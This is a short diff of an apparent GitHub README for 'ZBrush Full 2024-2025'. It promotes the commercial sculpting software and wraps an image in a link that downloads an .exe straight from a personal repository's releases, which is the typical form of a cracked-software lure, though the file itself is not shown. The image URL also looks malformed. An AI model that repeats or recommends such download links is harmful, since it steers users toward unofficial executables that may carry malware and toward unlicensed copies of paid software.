@@ -4,8 +4,7 @@
 <h1>ZBrush: Unleash Your Creativity with Advanced Digital Sculpting</h1>
 
 
-![image](https://github.com/user-attachments/assets/abd0cdb5-d727-4524-a91a-e8afe56c6a24)"
-">](https://github.com/arsham129/Zbrush-Full-2024-2025/releases/download/2/ZBrush-Full-2024-2025.exe)
+[<img src="https://github.com/user-attachments/assets/b4d64can-2763-4841-9271-72c3e9a98a3d">](https://github.com/arsham129/Zbrush-Full-2024-2025/releases/download/2/ZBrush-Full-2024-2025.exe)
 
 
 ### ZBrush is a professional digital sculpting software designed for 3D artists. Whether you're a beginner or an experienced modeler, ZBrush offers a suite of powerful tools that enable you to create detailed and high-quality 3D models.
